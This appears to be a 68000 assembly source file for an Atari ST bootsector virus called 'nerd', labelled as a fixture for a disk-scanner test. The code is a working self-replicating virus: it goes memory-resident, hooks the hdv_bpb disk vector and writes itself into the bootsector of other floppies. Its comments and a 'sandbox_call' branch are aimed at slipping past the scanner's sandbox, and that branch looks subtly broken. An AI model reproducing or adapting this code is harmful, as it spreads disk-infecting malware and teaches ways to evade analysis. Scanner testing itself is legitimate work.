; ------------------------------------------------------------------
; synth3-nerd.s — synthetic session-only ST bootsector virus "nerd"
; DiskCheck scanner fixture. Prints a message and infects other disks
; via an hdv_bpb hook, but installs NO resvalid/resvector — a warm
; reset kills it. Contrast case against synth1/synth2.
; ------------------------------------------------------------------

MEMTOP          equ     $0436
HDV_BPB         equ     $0472
TRAP13VEC       equ     $00b4

OLDHDV          equ     oldhdv-start
GENCNT          equ     gencnt-start
MARKOFF         equ     marker-start

                org     0
start:
                bra.s   main
                ds.b    28                      ; BPB spliced by build script

main:
                ; steal 1KB, copy resident
                move.l  MEMTOP.w,d0
                sub.l   #$400,d0
                move.l  d0,MEMTOP.w
                movea.l d0,a2
                lea     start(pc),a0
                ; longwords: a 512-iteration byte loop trips the scanner
                ; sandbox's spin detector before the copy finishes
                move.w  #$7f,d0
copy_loop:      move.l  (a0)+,(a2)+
                dbf     d0,copy_loop
                suba.l  #$200,a2

                ; hook hdv_bpb -> resident infect (session only)
                move.l  HDV_BPB.w,d0
                move.l  d0,OLDHDV(a2)
                move.l  a2,d0
                add.l   #infect,d0
                move.l  d0,HDV_BPB.w

                ; payload: the message. No resvalid/resvector — a reset
                ; reinitialises hdv_bpb and this virus is gone.
                pea     msg(pc)
                move.w  #9,-(sp)              ; Cconws
                trap    #1
                addq.l  #6,sp

                bsr.s   replicate
                rts

; ------------- boot-time self write-back -----------------------------------
replicate:
                lea     start(pc),a0
                addq.b  #1,GENCNT(a0)
                move.l  TRAP13VEC.w,d0
                beq.s   sandbox_call
                clr.w   -(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     start(pc)
                move.w  #1,-(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
                rts
sandbox_call:   clr.w   -(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     start(pc)
                move.w  #1,-(sp)
                move.w  #4,d0
                trap    #13
                adda.l  #12,sp
                rts

; ------------- hdv_bpb hook ------------------------------------------------
infect:
                movem.l d0-d3/a0-a3,-(sp)
                move.w  d0,d3
                cmpi.w  #1,d3
                bgt.w   infect_done
                suba.l  #544,sp
                movea.l sp,a1
                move.w  d3,-(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     (a1)
                clr.w   -(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
                tst.l   d0
                bne.w   infect_rdone
                move.l  MARKOFF(a1),d0
                move.l  marker(pc),d1
                cmp.l   d0,d1
                beq.w   infect_rdone
                lea     2(a1),a0
                lea     512(a1),a3
                moveq   #27,d0
save_bpb:       move.b  (a0)+,(a3)+
                dbf     d0,save_bpb
                lea     start(pc),a0
                move.w  #$1ff,d0
stamp:          move.b  (a0)+,(a1)+
                dbf     d0,stamp
                suba.l  #$200,a1
                lea     2(a1),a0
                lea     512(a1),a3
                moveq   #27,d0
rest_bpb:       move.b  (a3)+,(a0)+
                dbf     d0,rest_bpb
                move.w  d3,-(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     (a1)
                move.w  #1,-(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
infect_rdone:   adda.l  #544,sp
infect_done:    movem.l (sp)+,d0-d3/a0-a3
                move.l  oldhdv(pc),a0
                jmp     (a0)

; ------------------------------ data ---------------------------------------
msg:            dc.b    13,10,'this disk is infected by AI nerd magic',13,10,0
                even
marker:         dc.b    'NERD'
gencnt:         dc.b    0
                even
oldhdv:         dc.l    0
